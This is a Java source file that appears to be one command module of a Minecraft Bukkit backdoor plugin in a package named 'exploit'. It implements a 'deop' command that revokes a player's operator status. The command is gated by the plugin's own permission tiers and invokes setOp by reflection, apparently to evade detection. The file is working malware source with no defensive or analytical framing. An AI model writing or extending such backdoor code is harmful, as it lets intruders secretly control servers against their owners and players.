package com.tmquan2508.exploit.commands;

import com.tmquan2508.exploit.Exploit;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class DeopCommand extends Command {
    public DeopCommand() { super(); }
    @Override public String getName() { return "deop"; }
    @Override public String getDescription() { return "Revokes operator status from a player."; }
    @Override public String getUsage() { return "[player]"; }
    @Override public int getRequirePerm() { return 2; }
    @Override public void execute(Player sender, String[] args) {
        Player target;
        if (args.length < 1) {
            target = sender;
        } else {
            target = Bukkit.getPlayer(args[0]);
            if (target == null) {
                Exploit.sender.sendError(sender, "Player not found: " + args[0]);
                return;
            }
        }

        final Player finalTarget = target;
        Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
            Exploit.DynamicInvoker.invokeInstanceMethod( finalTarget, "setOp", void.class, new Class<?>[]{boolean.class}, false );
            Exploit.sender.sendMessage(sender, finalTarget.getName() + " is no longer op.");
        });
    }
}